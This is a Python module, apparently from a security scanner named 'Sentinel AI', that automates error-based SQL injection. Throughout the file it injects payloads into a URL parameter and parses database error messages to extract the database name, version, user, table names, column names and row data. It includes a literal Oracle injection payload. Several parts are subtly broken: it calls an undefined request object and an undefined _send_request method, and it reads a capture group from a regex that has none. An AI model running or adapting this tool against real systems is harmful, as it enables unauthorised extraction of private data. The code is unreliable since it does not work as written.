"""
===========================================================
Project : Sentinel AI
Module  : Error-Based SQL Extractor
File ID : SCANNER-ERROR-EXTRACTOR-001
Version : 1.0.0
===========================================================

Description:
Extracts data using Error-Based SQL Injection.
Supports MySQL, PostgreSQL, MSSQL, and Oracle.
"""

from __future__ import annotations

import re
import logging
from typing import List, Optional, Dict, Any

from app.modules.scanner.modules.error_payloads import ErrorPayloadGenerator

logger = logging.getLogger(__name__)


class ErrorExtractor:
    """
    Extracts data using Error-Based SQL Injection.
    """

    def __init__(self, target: str, dbms: str = "MySQL"):
        self.target = target
        self.parameter: str = "category"
        self.dbms = dbms
        self.payload_gen = ErrorPayloadGenerator(dbms)

        self.statistics = {
            "requests": 0,
            "extractions": 0,
        }

    def extract_database(self) -> Optional[str]:
        """Extract database name."""
        logger.info("[ErrorExtractor] Extracting database name...")
        payload = self.payload_gen.get_database_payload()
        result = self._extract_from_error(payload)
        if result:
            logger.info(f"[ErrorExtractor] ✅ Database: {result}")
        return result

    def extract_version(self) -> Optional[str]:
        """Extract database version."""
        logger.info("[ErrorExtractor] Extracting database version...")
        payload = self.payload_gen.get_version_payload()
        result = self._extract_from_error(payload)
        if result:
            logger.info(f"[ErrorExtractor] ✅ Version: {result}")
        return result

    def extract_user(self) -> Optional[str]:
        """Extract current user."""
        logger.info("[ErrorExtractor] Extracting current user...")
        payload = self.payload_gen.get_user_payload()
        result = self._extract_from_error(payload)
        if result:
            logger.info(f"[ErrorExtractor] ✅ User: {result}")
        return result

    def extract_tables(self, limit: int = 50) -> List[str]:
        """Extract table names."""
        logger.info("[ErrorExtractor] Extracting tables...")
        tables = []

        for i in range(limit):
            payload = self.payload_gen.get_tables_payload(i)
            table = self._extract_from_error(payload)
            if table:
                tables.append(table)
                logger.info(f"[ErrorExtractor]   Table {i+1}: {table}")
            else:
                break

        return tables

    def extract_columns(self, table: str, limit: int = 30) -> List[str]:
        """Extract column names from a table."""
        logger.info(f"[ErrorExtractor] Extracting columns from {table}...")
        columns = []

        for i in range(limit):
            payload = self.payload_gen.get_columns_payload(table, i)
            column = self._extract_from_error(payload)
            if column:
                columns.append(column)
                logger.info(f"[ErrorExtractor]   Column {i+1}: {column}")
            else:
                break

        return columns

    def extract_data(self, table: str, column: str, limit: int = 20) -> List[str]:
        """Extract data from a table."""
        logger.info(f"[ErrorExtractor] Extracting data from {table}.{column}...")
        data = []

        for i in range(limit):
            payload = self.payload_gen.get_data_payload(column, table, i)
            value = self._extract_from_error(payload)
            if value:
                data.append(value)
                logger.info(f"[ErrorExtractor]   Row {i+1}: {value}")
            else:
                break

        return data

    def _extract_oracle_value(self, payload: str) -> Optional[str]:
        """
        Extract value from Oracle error message.
        Oracle returns errors like: ORA-01756: quoted string not properly terminated
        """
        response = self._send_request(payload)

        if response is None:
            return None

        body = response.body

        # Oracle error patterns
        patterns = [
            r"ORA-[0-9]{5}:\s*([^\n]+)",
            r"invalid number: \"([^\"]+)\"",
            r"value '([^']+)'",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
        ]

        for pattern in patterns:
            match = re.search(pattern, body, re.I)
            if match:
                return match.group(1).strip()

        return None

    def _extract_oracle_tables(self, limit: int = 50) -> List[str]:
        """Extract tables from Oracle using error-based technique."""
        tables = []

        for i in range(limit):
            # Oracle: SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1 AND TABLE_NAME NOT IN (SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM<={i})
            payload = f"' AND 1=TO_NUMBER((SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1 AND TABLE_NAME NOT IN (SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM<={i})))--"
            table = self._extract_oracle_value(payload)
            if table:
                tables.append(table)
                logger.info(f"[ErrorExtractor]   Table {i+1}: {table}")
            else:
                break

        return tables

    def _extract_from_error(self, payload: str) -> Optional[str]:
        """
        Send payload and extract value from error message.

        Args:
            payload: SQL injection payload

        Returns:
            Extracted value or None
        """
        self.statistics["requests"] += 1

        # ============================================================
        # DEBUG: Log the payload being sent
        # ============================================================
        logger.debug(f"[ErrorExtractor] 📤 Sending payload: {payload[:100]}...")

        try:
            if "?" in self.target:
                base_url = self.target.split("?")[0]
                existing_params = (
                    self.target.split("?")[1] if "?" in self.target else ""
                )
                if existing_params:
                    url = f"{base_url}?{existing_params}&{self.parameter}={payload}"
                else:
                    url = f"{base_url}?{self.parameter}={payload}"
            else:
                url = f"{self.target}?{self.parameter}={payload}"

            response = self.request.send(
                method="GET",
                url=url,
            )

            if response is None:
                logger.debug(f"[ErrorExtractor] ❌ No response")
                return None

            body = response.body
            logger.debug(f"[ErrorExtractor] 📥 Response length: {len(body)}")

            # ============================================================
            # Extract value from error message - DBMS-specific patterns
            # ============================================================
            patterns = {
                "MySQL": [
                    r"XPATH syntax error: '~([^']+)'",
                    r"~([^']+)",
                    r"Duplicate entry '([^']+)'",
                ],
                "PostgreSQL": [
                    r"ERROR:\s*([^\n]+)",
                    r"invalid input syntax for type int: \"([^\"]+)\"",
                    r"value \"([^\"]+)\"",
                ],
                "MSSQL": [
                    r"Conversion failed when converting the value '([^']+)'",
                    r"value '([^']+)'",
                ],
                "Oracle": [
                    r"ORA-[0-9]{5}:\s*([^\n]+)",
                    r"invalid number: \"([^\"]+)\"",
                    r"value '([^']+)'",
                ],
            }

            # Use DBMS-specific patterns
            dbms_patterns = patterns.get(self.dbms, patterns["MySQL"])

            for pattern in dbms_patterns:
                match = re.search(pattern, body, re.I)
                if match:
                    extracted = match.group(1).strip()
                    logger.info(f"[ErrorExtractor] ✅ Extracted: {extracted}")
                    self.statistics["extractions"] += 1
                    return extracted

            logger.debug(f"[ErrorExtractor] ❌ No pattern matched in response")
            return None

        except Exception as e:
            logger.debug(f"[ErrorExtractor] ❌ Request failed: {e}")
            return None


def create_error_extractor(target: str, dbms: str = "MySQL") -> ErrorExtractor:
    """Factory function for ErrorExtractor."""
    return ErrorExtractor(target, dbms)
